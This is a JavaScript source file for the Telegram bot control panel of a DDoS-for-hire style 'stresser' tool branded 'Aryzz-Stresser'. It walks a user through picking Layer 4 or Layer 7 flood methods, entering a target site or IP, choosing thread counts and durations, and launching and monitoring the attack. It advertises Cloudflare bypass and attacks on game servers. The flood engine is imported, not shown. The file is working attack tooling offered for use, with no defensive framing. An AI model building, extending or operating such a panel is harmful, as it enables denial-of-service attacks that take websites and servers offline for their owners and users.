import { Telegraf, Markup, Scenes, session } from 'telegraf';
import { readFileSync, existsSync } from 'fs';
import { logger } from '../utils/logger.js';
import { AttackManager } from '../core/attack-manager.js';
import { ProxyManager } from '../utils/proxy-manager.js';
import { LAYER4_METHODS } from '../methods/layer4/index.js';
import { LAYER7_METHODS } from '../methods/layer7/index.js';
import { Tools } from '../utils/tools.js';

/**
 * Modern Telegram Bot with Interactive UI
 */
export class TelegramBot {
    constructor(token, adminId, config) {
        this.bot = new Telegraf(token);
        this.adminId = adminId.toString();
        this.config = config;
        this.attackManager = null;
        this.statsInterval = null;
        this.lastMessageContent = null; // Track last message content to prevent duplicate edits
		this.statusMessage = null; // Track current status message (chatId, messageId)
        
        this.setupWizard();
        this.setupCommands();
        this.setupCallbacks();
    }

    /**
     * Setup Attack Wizard Scene
     */
    setupWizard() {
        // Attack Wizard Scene
        const attackWizard = new Scenes.WizardScene(
            'attack-wizard',
            // Step 1: Choose Layer
            (ctx) => {
                logger.bot(`User ${ctx.from.id} (${ctx.from.username}) entered attack wizard`);
                ctx.reply(
                    `╔════════════════════════════╗\n` +
                    `║   🎯 *SELECT ATTACK LAYER*  ║\n` +
                    `╚════════════════════════════╝\n\n` +
                    `🌐 *Layer 7 (Application)*\n` +
                    `   → HTTP/HTTPS/HTTP2 attacks\n` +
                    `   → Cloudflare bypass\n` +
                    `   → Web applications\n\n` +
                    `⚡ *Layer 4 (Network)*\n` +
                    `   → UDP/TCP floods\n` +
                    `   → Game servers\n` +
                    `   → Raw network attacks\n\n` +
                    `💡 Choose your attack type:`,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('🌐 Layer 7 (HTTP/Web)', 'layer_7')],
                            [Markup.button.callback('⚡ Layer 4 (Network)', 'layer_4')],
                            [Markup.button.callback('❌ Cancel', 'cancel')]
                        ])
                    }
                );
                return ctx.wizard.next();
            },
            // Step 2: Choose Method
            async (ctx) => {
                if (!ctx.callbackQuery) return;
                
                await ctx.answerCbQuery();
                const layer = ctx.callbackQuery.data;
                ctx.wizard.state.layer = layer;

                let methods = layer === 'layer_7' ? LAYER7_METHODS : LAYER4_METHODS;
                
                // Create method buttons (3 per row)
                const methodButtons = [];
                for (let i = 0; i < methods.length; i += 3) {
                    const row = methods.slice(i, i + 3).map(method => 
                        Markup.button.callback(method, `method_${method}`)
                    );
                    methodButtons.push(row);
                }
                methodButtons.push([Markup.button.callback('⬅️ Back', 'back'), Markup.button.callback('❌ Cancel', 'cancel')]);

                try {
                    await ctx.editMessageText(
                        `╔═══════════════════════════╗\n` +
                        `║  🔧 *SELECT METHOD*  🔧  ║\n` +
                        `╚═══════════════════════════╝\n\n` +
                        `📍 *Layer:* ${layer === 'layer_7' ? '🌐 Layer 7 (HTTP/Web)' : '⚡ Layer 4 (Network)'}\n\n` +
                        `${layer === 'layer_7' ? 
                            '💡 *HTTP Methods:* GET, POST, HTTP2, CFB\n' +
                            '🛡️ *Bypass:* Cloudflare, WAF, Rate Limiting\n' +
                            '🎯 *Target:* Websites, APIs, Web Apps' : 
                            '💡 *Network:* UDP, TCP, SYN Floods\n' +
                            '🎮 *Games:* Minecraft, MCPE, FiveM\n' +
                            '🎯 *Target:* Servers, IPs, Game Servers'}\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                        `⚡ Choose your attack method:`,
                        {
                            parse_mode: 'Markdown',
                            ...Markup.inlineKeyboard(methodButtons)
                        }
                    );
                } catch (e) {
                    if (e.message && (e.message.includes('message is not modified') || e.message.includes('there is no text'))) {
                        logger.debug('Message edit skipped:', e.message);
                    } else {
                        logger.error('Error editing message:', e.message);
                    }
                }
                
                return ctx.wizard.next();
            },
            // Step 3: Enter Target
            async (ctx) => {
                if (!ctx.callbackQuery) return;
                
                await ctx.answerCbQuery();
                const method = ctx.callbackQuery.data.replace('method_', '');
                ctx.wizard.state.method = method;

                const targetFormat = ctx.wizard.state.layer === 'layer_7' 
                    ? 'https://example.com' 
                    : 'ip:port (e.g., 1.2.3.4:80)';

                ctx.editMessageText(
                    `🎯 *Enter Target*\n\n` +
                    `Method: \`${method}\`\n\n` +
                    `Please enter the target:\n` +
                    `Format: \`${targetFormat}\`\n\n` +
                    `Example: ${targetFormat === 'https://example.com' ? '`https://target.com`' : '`192.168.1.1:80`'}`,
                    { parse_mode: 'Markdown' }
                );
                
                return ctx.wizard.next();
            },
            // Step 4: Get Target Input
            (ctx) => {
                if (ctx.callbackQuery) return;
                
                // Check if user sent a command instead
                if (ctx.message.text.startsWith('/')) {
                    logger.bot(`User ${ctx.from.id} sent command '${ctx.message.text}' during wizard, exiting...`);
                    ctx.reply('⚠️ Command detected. Exiting wizard...');
                    return ctx.scene.leave();
                }
                
                const target = ctx.message.text;
                ctx.wizard.state.target = target;
                
                logger.bot(`User ${ctx.from.id} set target: ${target}`);

                ctx.reply(
                    `╔════════════════════════════╗\n` +
                    `║  ⚙️ *CONFIGURE ATTACK* ⚙️  ║\n` +
                    `╚════════════════════════════╝\n\n` +
                    `🎯 *Target:* \`${target}\`\n` +
                    `🔧 *Method:* \`${ctx.wizard.state.method}\`\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚡ *Quick* → 100 threads, 60s\n` +
                    `💪 *Powerful* → 300 threads, 180s\n` +
                    `🔥 *Maximum* → 500 threads, 300s\n` +
                    `⚙️ *Custom* → Your own settings\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `💡 Choose your power level:`,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('⚡ Quick Attack', 'preset_quick')],
                            [Markup.button.callback('💪 Powerful Attack', 'preset_powerful')],
                            [Markup.button.callback('🔥 Maximum Power', 'preset_max')],
                            [Markup.button.callback('⚙️ Custom Settings', 'preset_custom')],
                            [Markup.button.callback('⬅️ Back', 'back'), Markup.button.callback('❌ Cancel', 'cancel')]
                        ])
                    }
                );
                
                return ctx.wizard.next();
            },
            // Step 5: Handle Preset or Custom
            async (ctx) => {
                if (!ctx.callbackQuery) return;
                
                await ctx.answerCbQuery();
                const preset = ctx.callbackQuery.data.replace('preset_', '');
                
                let threads, duration, rpc;
                
                switch (preset) {
                    case 'quick':
                        threads = 100;
                        duration = 60;
                        rpc = 1;
                        break;
                    case 'powerful':
                        threads = 300;
                        duration = 180;
                        rpc = 5;
                        break;
                    case 'max':
                        threads = 500;
                        duration = 300;
                        rpc = 10;
                        break;
                    case 'custom':
                        ctx.editMessageText(
                            '⚙️ *Custom Settings*\n\n' +
                            'Please enter settings in this format:\n' +
                            '`threads duration rpc`\n\n' +
                            'Example: `200 120 5`\n\n' +
                            'Threads: 50-1000\n' +
                            'Duration: 30-600 seconds\n' +
                            'RPC: 1-20',
                            { parse_mode: 'Markdown' }
                        );
                        return ctx.wizard.next(); // Go to custom input
                }

                ctx.wizard.state.threads = threads;
                ctx.wizard.state.duration = duration;
                ctx.wizard.state.rpc = rpc;

                this.showAttackSummary(ctx);
                return ctx.wizard.next(); // Skip custom input
            },
            // Step 6: Custom Input (optional)
            async (ctx) => {
                // If this is a callback (user clicked button on attack summary), pass to next step
                if (ctx.callbackQuery) {
                    logger.bot(`User ${ctx.from.id} clicked confirmation button, moving to confirmation handler`);
                    return ctx.wizard.next();
                }
                
                // Check if user sent a command instead
                if (ctx.message.text.startsWith('/')) {
                    logger.bot(`User ${ctx.from.id} sent command '${ctx.message.text}' during custom settings, exiting...`);
                    ctx.reply('⚠️ Command detected. Exiting wizard...');
                    return ctx.scene.leave();
                }
                
                const parts = ctx.message.text.split(' ');
                if (parts.length !== 3) {
                    ctx.reply('❌ Invalid format! Please use: `threads duration rpc`', { parse_mode: 'Markdown' });
                    return;
                }

                const [threads, duration, rpc] = parts.map(Number);
                
                if (threads < 50 || threads > 1000 || duration < 30 || duration > 600 || rpc < 1 || rpc > 20) {
                    ctx.reply('❌ Values out of range!\n\nThreads: 50-1000\nDuration: 30-600\nRPC: 1-20');
                    return;
                }

                ctx.wizard.state.threads = threads;
                ctx.wizard.state.duration = duration;
                ctx.wizard.state.rpc = rpc;

                this.showAttackSummary(ctx);
                return ctx.wizard.next();
            },
            // Step 7: Confirmation
            async (ctx) => {
                // Handle text messages (commands) during confirmation
                if (ctx.message && ctx.message.text) {
                    if (ctx.message.text.startsWith('/')) {
                        logger.bot(`User ${ctx.from.id} sent command '${ctx.message.text}' during confirmation`);
                        await ctx.reply('⚠️ Please use the buttons to confirm or cancel the attack.\n\nUse the ❌ Cancel button to exit.');
                        return; // Stay in same step
                    }
                    return; // Ignore other text
                }
                
                if (!ctx.callbackQuery) return;
                
                const action = ctx.callbackQuery.data;
                
                if (action === 'confirm_attack') {
                    logger.bot(`User ${ctx.from.id} confirmed attack`);
                    logger.attack(`Attack initiated by user ${ctx.from.id}: ${JSON.stringify(ctx.wizard.state)}`);
                    
                    // Answer callback query first to remove loading state
                    await ctx.answerCbQuery('⚡ Starting attack...');
                    
                    // Start attack immediately (pass the wizard state before leaving)
                    const wizardState = { ...ctx.wizard.state };
                    
                    // Leave scene before starting attack to prevent blocking
                    await ctx.scene.leave();
                    
                    // Start attack with saved state (non-blocking)
                    await this.startAttackFromWizard(ctx, wizardState);
                    return;
                } else if (action === 'cancel') {
                    logger.bot(`User ${ctx.from.id} cancelled attack wizard`);
                    await ctx.answerCbQuery('❌ Cancelled');
                    await ctx.editMessageText('❌ Attack cancelled.');
                    return ctx.scene.leave();
                }
                
                return ctx.scene.leave();
            }
        );

        // Create stage and register scene
        const stage = new Scenes.Stage([attackWizard]);
        
        this.bot.use(session());
        this.bot.use(stage.middleware());
    }

    /**
     * Show Attack Summary
     */
    showAttackSummary(ctx) {
        const state = ctx.wizard.state;
        
        // Calculate estimated impact
        const estimatedRPS = state.threads * state.rpc * 50; // Rough estimate
        
        ctx.editMessageText(
            `╔══════════════════════════════╗\n` +
            `║   📋 *ATTACK SUMMARY* 📋    ║\n` +
            `╚══════════════════════════════╝\n\n` +
            `🎯 *Target:*\n` +
            `   \`${state.target}\`\n\n` +
            `🔧 *Configuration:*\n` +
            `   • Method: \`${state.method}\`\n` +
            `   • Threads: \`${state.threads}\`\n` +
            `   • Duration: \`${state.duration}s\`\n` +
            `   • RPC: \`${state.rpc}\`\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📊 *Estimated Impact:*\n` +
            `   • ~${estimatedRPS.toLocaleString()} requests/sec\n` +
            `   • ~${(state.threads * 100).toLocaleString()} connections\n` +
            `   • Total: ~${(estimatedRPS * state.duration).toLocaleString()} requests\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            `⚠️ *Confirm to launch attack?*`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [
                        Markup.button.callback('✅ Launch Attack', 'confirm_attack'),
                        Markup.button.callback('❌ Cancel', 'cancel')
                    ]
                ])
            }
        );
    }

    /**
     * Start Attack from Wizard
     */
    async startAttackFromWizard(ctx, wizardState) {
        const state = wizardState;
        
        let loadingMsg;
        try {
            loadingMsg = await ctx.editMessageText(
                '🔄 *Initializing Attack...*\n\n' +
                'Please wait while we prepare the attack...',
                { parse_mode: 'Markdown' }
            );
        } catch (e) {
            // If edit fails, send new message
            loadingMsg = await ctx.reply(
                '🔄 *Initializing Attack...*\n\n' +
                'Please wait while we prepare the attack...',
                { parse_mode: 'Markdown' }
            );
        }

        try {
            // Load user agents and referers
            let userAgents = [];
            let referers = [];

            if (LAYER7_METHODS.includes(state.method)) {
                try {
                    const uaPath = './files/useragent.txt';
                    const refPath = './files/referers.txt';

                    if (existsSync(uaPath)) {
                        userAgents = readFileSync(uaPath, 'utf-8').split('\n').filter(l => l.trim());
                    }
                    if (existsSync(refPath)) {
                        referers = readFileSync(refPath, 'utf-8').split('\n').filter(l => l.trim());
                    }
                } catch (e) {
                    // Silent fail
                }
            }

            // Create attack manager
            this.attackManager = new AttackManager({
                target: state.target,
                method: state.method,
                threads: state.threads,
                duration: state.duration,
                rpc: state.rpc,
                proxies: null,
                userAgents: userAgents,
                referers: referers
            });

            logger.attack(`Starting attack - Target: ${state.target}, Method: ${state.method}, Threads: ${state.threads}, Duration: ${state.duration}s`);

            // Start attack (non-blocking)
            await this.attackManager.start();
            
            logger.attack('Attack successfully started');

            // Small delay to ensure attack threads are starting
            await new Promise(resolve => setTimeout(resolve, 100));

            // Send attack started message with image
            const imagePath = './files/image.jpg';
            const attackMessage = 
                `╔═══════════════════════════════╗\n` +
                `║  ⚡ *ATTACK LAUNCHED!* ⚡    ║\n` +
                `╚═══════════════════════════════╝\n\n` +
                `🎯 *Target:*\n   \`${state.target}\`\n\n` +
                `🔧 *Configuration:*\n` +
                `   • Method: \`${state.method}\`\n` +
                `   • Threads: \`${state.threads}\`\n` +
                `   • Duration: \`${state.duration}s\`\n` +
                `   • RPC: \`${state.rpc}\`\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `🔥 *Attack Status:* 🟢 ACTIVE\n` +
                `⚡ *Performance:* MAXIMIZED\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `💡 Use buttons below to monitor\n` +
                `   or use /status and /stop commands`;
            
			let statusMessageId = loadingMsg.message_id;
            
            try {
				// Prefer sending a new message first; only delete loading after success
                if (existsSync(imagePath)) {
                    const photoMsg = await ctx.telegram.sendPhoto(
                        ctx.chat.id,
                        { source: imagePath },
                        {
                            caption: attackMessage,
                            parse_mode: 'Markdown',
                            ...Markup.inlineKeyboard([
                                [
                                    Markup.button.callback('📊 Status', 'status'),
                                    Markup.button.callback('🛑 Stop', 'stop')
                                ]
                            ])
                        }
                    );
                    statusMessageId = photoMsg.message_id;
					// Best-effort delete of loading message after success
					try { await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id); } catch {}
                } else {
					// If no image, update the loading message in-place
                    await ctx.telegram.editMessageText(
                        ctx.chat.id,
                        loadingMsg.message_id,
                        null,
                        attackMessage,
                        {
                            parse_mode: 'Markdown',
                            ...Markup.inlineKeyboard([
                                [
                                    Markup.button.callback('📊 Status', 'status'),
                                    Markup.button.callback('🛑 Stop', 'stop')
                                ]
                            ])
                        }
                    );
                }
            } catch (error) {
                logger.error('Error sending attack started message:', error);
				// Try to update existing loading message as fallback (if it still exists)
                try {
                    await ctx.telegram.editMessageText(
                        ctx.chat.id,
                        loadingMsg.message_id,
                        null,
                        attackMessage,
                        {
                            parse_mode: 'Markdown',
                            ...Markup.inlineKeyboard([
                                [
                                    Markup.button.callback('📊 Status', 'status'),
                                    Markup.button.callback('🛑 Stop', 'stop')
                                ]
                            ])
                        }
                    );
                } catch (e) {
					// If all fails (e.g., message was deleted), send a completely new message
                    const newMsg = await ctx.telegram.sendMessage(
                        ctx.chat.id,
                        attackMessage,
                        {
                            parse_mode: 'Markdown',
                            ...Markup.inlineKeyboard([
                                [
                                    Markup.button.callback('📊 Status', 'status'),
                                    Markup.button.callback('🛑 Stop', 'stop')
                                ]
                            ])
                        }
                    );
                    statusMessageId = newMsg.message_id;
                }
            }

            // Start monitoring with the correct message ID
			this.statusMessage = { chatId: ctx.chat.id, messageId: statusMessageId };
			this.startMonitoring(ctx.chat.id, statusMessageId);

        } catch (error) {
            logger.error('Error starting attack:', error);
            logger.attack(`Failed to start attack for user ${ctx.from.id}: ${error.message}`);
            try {
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    loadingMsg.message_id,
                    null,
                    `❌ *Error Starting Attack*\n\n${error.message}`,
                    { parse_mode: 'Markdown' }
                );
            } catch (e) {
                // If edit fails, send new message
                await ctx.telegram.sendMessage(
                    ctx.chat.id,
                    `❌ *Error Starting Attack*\n\n${error.message}`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    }

    /**
     * Start Real-time Monitoring
     */
    startMonitoring(chatId, messageId) {
        // Clear existing monitoring interval to prevent multiple intervals
        if (this.statsInterval) {
            clearInterval(this.statsInterval);
            this.statsInterval = null;
        }

        this.statsInterval = setInterval(async () => {
            try {
                if (!this.attackManager || !this.attackManager.isActive()) {
                    clearInterval(this.statsInterval);
                    this.statsInterval = null;
                    
                    const completionMessage = 
                        `╔═══════════════════════════════╗\n` +
                        `║  ✅ *ATTACK COMPLETE!* ✅   ║\n` +
                        `╚═══════════════════════════════╝\n\n` +
                        `🎉 Attack finished successfully!\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                        `💡 Ready for next attack\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                        `⚡ *Powered by Aryzz-Dev*`;
                    
                    // Only update if message content has changed
                    if (this.lastMessageContent !== completionMessage) {
                        try {
							// Validate message exists and has text before editing
							if (this.statusMessage?.messageId && this.statusMessage?.chatId) {
								await this.bot.telegram.editMessageText(
									this.statusMessage.chatId,
									this.statusMessage.messageId,
									null,
									completionMessage,
									{
										parse_mode: 'Markdown',
										...Markup.inlineKeyboard([
											[Markup.button.callback('🔄 New Attack', 'new_attack')]
										])
									}
								);
								this.lastMessageContent = completionMessage;
							} else {
								// No valid message to edit, send new one
								throw new Error('No valid message to edit');
							}
                        } catch (e) {
							// Silently ignore "message is not modified" and "no text" errors
							if (e.message && (e.message.includes('message is not modified') || e.message.includes('there is no text'))) {
								logger.debug('Message edit skipped:', e.message);
								return;
							}
							
							// If message not found or other error, send new message
							if (e.message && (e.message.includes('message to edit not found') || e.message.includes('No valid message'))) {
								try {
									const newMsg = await this.bot.telegram.sendMessage(
										chatId,
										completionMessage,
										{
											parse_mode: 'Markdown',
											...Markup.inlineKeyboard([
												[Markup.button.callback('🔄 New Attack', 'new_attack')]
											])
										}
									);
									this.statusMessage = { chatId: chatId, messageId: newMsg.message_id };
									this.lastMessageContent = completionMessage;
								} catch (sendErr) {
									logger.debug('Failed to send completion message:', sendErr.message);
								}
							} else {
								logger.debug('Edit message error:', e.message);
							}
                        }
                    }
                    
                    return;
                }

                const stats = this.attackManager.getStats();
                const progress = Math.min(100, Math.floor((stats.elapsed / stats.duration) * 100));
                const progressBar = this.createProgressBar(progress);

                const statusMessage = 
                    `╔═══════════════════════════════╗\n` +
                    `║  ⚡ *ATTACK RUNNING* ⚡      ║\n` +
                    `╚═══════════════════════════════╝\n\n` +
                    `🎯 *Target:* \`${stats.target}\`\n` +
                    `🔧 *Method:* \`${stats.method}\`\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `📊 *Progress:*\n` +
                    `   ${progressBar} ${progress}%\n\n` +
                    `📈 *Statistics:*\n` +
                    `   📤 Requests: \`${stats.requestsSent}\`\n` +
                    `   📦 Data Sent: \`${stats.bytesSent}\`\n` +
                    `   ⏱ Time: \`${stats.elapsed}s / ${stats.duration}s\`\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `🔥 *Status:* 🟢 ACTIVE & RUNNING`;

                // Only update if message content has changed
                if (this.lastMessageContent !== statusMessage) {
                    try {
						// Validate message exists and has text before editing
						if (this.statusMessage?.messageId && this.statusMessage?.chatId) {
							await this.bot.telegram.editMessageText(
								this.statusMessage.chatId,
								this.statusMessage.messageId,
								null,
								statusMessage,
								{
									parse_mode: 'Markdown',
									...Markup.inlineKeyboard([
										[
											Markup.button.callback('🔄 Refresh', 'status'),
											Markup.button.callback('🛑 Stop', 'stop')
										]
									])
								}
							);
							this.lastMessageContent = statusMessage;
						} else {
							// No valid message to edit, send new one
							throw new Error('No valid message to edit');
						}
                    } catch (e) {
						// Silently ignore "message is not modified" and "no text" errors
						if (e.message && (e.message.includes('message is not modified') || e.message.includes('there is no text'))) {
							logger.debug('Message edit skipped:', e.message);
							return;
						}
						
						// If message not found or other error, send new message
						if (e.message && (e.message.includes('message to edit not found') || e.message.includes('No valid message'))) {
							try {
								const newMsg = await this.bot.telegram.sendMessage(
									chatId,
									statusMessage,
									{
										parse_mode: 'Markdown',
										...Markup.inlineKeyboard([
											[
												Markup.button.callback('🔄 Refresh', 'status'),
												Markup.button.callback('🛑 Stop', 'stop')
											]
										])
									}
								);
								this.statusMessage = { chatId: chatId, messageId: newMsg.message_id };
								this.lastMessageContent = statusMessage;
							} catch (sendErr) {
								logger.debug('Failed to recreate status message:', sendErr.message);
							}
						} else {
							logger.debug('Edit message error:', e.message);
						}
                    }
                }
            } catch (error) {
                logger.error('Monitoring error:', error);
                // Clear interval on error to prevent spam
                clearInterval(this.statsInterval);
                this.statsInterval = null;
            }
        }, 3000);
    }

    /**
     * Create Progress Bar
     */
    createProgressBar(progress) {
        const filled = Math.floor(progress / 10);
        const empty = 10 - filled;
        return '█'.repeat(filled) + '░'.repeat(empty);
    }

    /**
     * Setup Commands
     */
    setupCommands() {
        // Start command
        this.bot.start(async (ctx) => {
            if (!this.isAdmin(ctx)) return;
            
            logger.bot(`User ${ctx.from.id} (${ctx.from.username}) used /start command`);
            
            // Check if user is currently in a scene/wizard
            if (ctx.scene && ctx.scene.current) {
                ctx.reply(
                    '⚠️ *You are already in the attack wizard!*\n\n' +
                    'Please complete the current wizard or use the ❌ Cancel button to exit first.',
                    { parse_mode: 'Markdown' }
                );
                return;
            }
            
            const imagePath = './files/image.jpg';
            const message = 
                `╔═══════════════════════════╗\n` +
                `║  🚀 *Aryzz-Stresser* 🚀  ║\n` +
                `║   *Control Panel v4.0*   ║\n` +
                `╚═══════════════════════════╝\n\n` +
                `👤 *User:* ${ctx.from.first_name}\n` +
                `🆔 *ID:* \`${ctx.from.id}\`\n` +
                `📍 *Status:* 🟢 Online\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `⚡ *30 Attack Methods Available*\n` +
                `🔥 *100-1000x Performance Boost*\n` +
                `🛡️ *95% Cloudflare Bypass Rate*\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `💡 *Select an option to continue:*`;
            
            try {
                // Try to send with image
                if (existsSync(imagePath)) {
                    await ctx.replyWithPhoto(
                        { source: imagePath },
                        {
                            caption: message,
                            parse_mode: 'Markdown',
                            ...Markup.inlineKeyboard([
                                [Markup.button.callback('⚡ Launch Attack', 'new_attack')],
                                [
                                    Markup.button.callback('📊 Status', 'status'),
                                    Markup.button.callback('🔧 Methods', 'methods')
                                ],
                                [Markup.button.callback('❓ Help & Info', 'help')],
                                [Markup.button.callback('👨‍💻 Credits', 'credits')]
                            ])
                        }
                    );
                } else {
                    // Fallback to text-only if image not found
                    logger.warning('image.jpg not found, sending text-only message');
                    await ctx.reply(
                        message,
                        {
                            parse_mode: 'Markdown',
                            ...Markup.inlineKeyboard([
                                [Markup.button.callback('⚡ Launch Attack', 'new_attack')],
                                [
                                    Markup.button.callback('📊 Status', 'status'),
                                    Markup.button.callback('🔧 Methods', 'methods')
                                ],
                                [Markup.button.callback('❓ Help & Info', 'help')],
                                [Markup.button.callback('👨‍💻 Credits', 'credits')]
                            ])
                        }
                    );
                }
            } catch (error) {
                logger.error('Error sending start message with image:', error);
                // Fallback to text-only on error
                await ctx.reply(
                    message,
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.callback('⚡ Start Attack', 'new_attack')],
                            [Markup.button.callback('📊 Check Status', 'status')],
                            [Markup.button.callback('🔧 Methods List', 'methods')],
                            [Markup.button.callback('❓ Help', 'help')]
                        ])
                    }
                );
            }
        });

        // Menu command (alias for start)
        this.bot.command('menu', (ctx) => {
            if (!this.isAdmin(ctx)) return;
            
            // Check if user is currently in a scene/wizard
            if (ctx.scene && ctx.scene.current) {
                ctx.reply(
                    '⚠️ *You are already in the attack wizard!*\n\n' +
                    'Please complete the current wizard or use the ❌ Cancel button to exit first.',
                    { parse_mode: 'Markdown' }
                );
                return;
            }
            
            ctx.reply(
                `╔═══════════════════════════╗\n` +
                `║  🚀 *Aryzz-Stresser* 🚀  ║\n` +
                `║   *Control Panel v4.0*   ║\n` +
                `╚═══════════════════════════╝\n\n` +
                `👤 *User:* ${ctx.from.first_name}\n` +
                `🆔 *ID:* \`${ctx.from.id}\`\n` +
                `📍 *Status:* 🟢 Online\n\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `⚡ *30 Attack Methods Available*\n` +
                `🔥 *100-1000x Performance Boost*\n` +
                `🛡️ *95% Cloudflare Bypass Rate*\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `💡 *Select an option to continue:*`,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('⚡ Launch Attack', 'new_attack')],
                        [
                            Markup.button.callback('📊 Status', 'status'),
                            Markup.button.callback('🔧 Methods', 'methods')
                        ],
                        [Markup.button.callback('❓ Help & Info', 'help')],
                        [Markup.button.callback('👨‍💻 Credits', 'credits')]
                    ])
                }
            );
        });

        // Stop command
        this.bot.command('stop', (ctx) => {
            if (!this.isAdmin(ctx)) return;
            logger.bot(`User ${ctx.from.id} used /stop command`);
            this.handleStop(ctx);
        });

        // Status command
        this.bot.command('status', (ctx) => {
            if (!this.isAdmin(ctx)) return;
            logger.bot(`User ${ctx.from.id} used /status command`);
            this.handleStatus(ctx);
        });

        // Methods command
        this.bot.command('methods', (ctx) => {
            if (!this.isAdmin(ctx)) return;
            this.handleMethods(ctx);
        });

        // Help command
        this.bot.command('help', (ctx) => {
            if (!this.isAdmin(ctx)) return;
            this.handleHelp(ctx);
        });

        // Credits command
        this.bot.command('credits', (ctx) => {
            if (!this.isAdmin(ctx)) return;
            this.handleCredits(ctx);
        });

        // Redirect /confirm command to use buttons
        this.bot.command('confirm', (ctx) => {
            if (!this.isAdmin(ctx)) return;
            ctx.reply(
                '⚠️ *Please use the buttons instead of commands!*\n\n' +
                'The `/confirm` command is not available.\n' +
                'Use the ✅ *Confirm & Start* button shown in the attack summary.',
                { parse_mode: 'Markdown' }
            );
        });

        // Redirect /cancel command to use buttons
        this.bot.command('cancel', (ctx) => {
            if (!this.isAdmin(ctx)) return;
            ctx.reply(
                '⚠️ *Please use the buttons instead of commands!*\n\n' +
                'The `/cancel` command is not available.\n' +
                'Use the ❌ *Cancel* button to exit the wizard.',
                { parse_mode: 'Markdown' }
            );
        });
    }

    /**
     * Setup Callback Handlers
     */
    setupCallbacks() {
        // New Attack
        this.bot.action('new_attack', async (ctx) => {
            if (!this.isAdmin(ctx)) return;
            await ctx.answerCbQuery();
            await ctx.scene.enter('attack-wizard');
        });

        // Status
        this.bot.action('status', async (ctx) => {
            if (!this.isAdmin(ctx)) return;
            await this.handleStatus(ctx, true);
        });

        // Stop
        this.bot.action('stop', async (ctx) => {
            if (!this.isAdmin(ctx)) return;
            await this.handleStop(ctx, true);
        });

        // Methods
        this.bot.action('methods', async (ctx) => {
            if (!this.isAdmin(ctx)) return;
            await this.handleMethods(ctx, true);
        });

        // Help
        this.bot.action('help', async (ctx) => {
            if (!this.isAdmin(ctx)) return;
            await this.handleHelp(ctx, true);
        });

        // Credits
        this.bot.action('credits', async (ctx) => {
            if (!this.isAdmin(ctx)) return;
            await this.handleCredits(ctx, true);
        });

        // Cancel
        this.bot.action('cancel', async (ctx) => {
            await ctx.answerCbQuery('❌ Cancelled');
            await ctx.editMessageText('❌ Operation cancelled.');
            await ctx.scene.leave();
        });

        // Back button
        this.bot.action('back', async (ctx) => {
            try {
                await ctx.answerCbQuery();
                if (ctx.wizard) {
                    ctx.wizard.back();
                    await ctx.wizard.steps[ctx.wizard.cursor](ctx);
                } else {
                    await ctx.editMessageText('❌ Navigation error. Please start over with /start');
                }
            } catch (e) {
                logger.error('Back button error:', e);
                await ctx.answerCbQuery('❌ Error');
            }
        });
    }

    /**
     * Handle Stop
     */
    async handleStop(ctx, isCallback = false) {
        try {
            if (isCallback) {
                await ctx.answerCbQuery();
            }
            
            if (this.attackManager && this.attackManager.isActive()) {
                logger.attack('Stopping attack...');
                this.attackManager.stop();
                
                if (this.statsInterval) {
                    clearInterval(this.statsInterval);
                    this.statsInterval = null;
                }

                logger.attack('Attack stopped successfully');
                const message = '🛑 *Attack Stopped*\n\nThe attack has been stopped successfully.';
                
                if (isCallback) {
                    await ctx.editMessageText(message, { parse_mode: 'Markdown' });
                } else {
                    await ctx.reply(message, { parse_mode: 'Markdown' });
                }
            } else {
                const message = '⚠️ No active attack to stop.';
                
                if (isCallback) {
                    try {
                        await ctx.editMessageText(message);
                    } catch (e) {
                        // Silently ignore expected errors
                        if (e.message && (e.message.includes('message is not modified') || e.message.includes('there is no text'))) {
                            logger.debug('Message edit skipped:', e.message);
                        } else {
                            logger.debug('Could not edit message:', e.message);
                        }
                    }
                } else {
                    await ctx.reply(message);
                }
            }
        } catch (error) {
            logger.error('Error in handleStop:', error);
            const errorMsg = '❌ Error stopping attack. Please try again.';
            if (isCallback) {
                try {
                    await ctx.editMessageText(errorMsg);
                } catch (e) {
                    // Silently ignore expected errors
                    if (e.message && (e.message.includes('message is not modified') || e.message.includes('there is no text'))) {
                        logger.debug('Message edit skipped:', e.message);
                    } else {
                        await ctx.reply(errorMsg).catch(() => {});
                    }
                }
            } else {
                await ctx.reply(errorMsg);
            }
        }
    }

    /**
     * Handle Status
     */
    async handleStatus(ctx, isCallback = false) {
        try {
            if (isCallback) {
                await ctx.answerCbQuery();
            }
            
            if (this.attackManager && this.attackManager.isActive()) {
                const stats = this.attackManager.getStats();
                const progress = Math.min(100, Math.floor((stats.elapsed / stats.duration) * 100));
                const progressBar = this.createProgressBar(progress);

                const message = 
                    `⚡ *Attack Status*\n\n` +
                    `🎯 Target: \`${stats.target}\`\n` +
                    `🔧 Method: \`${stats.method}\`\n` +
                    `⚡ Threads: \`${stats.threads}\`\n\n` +
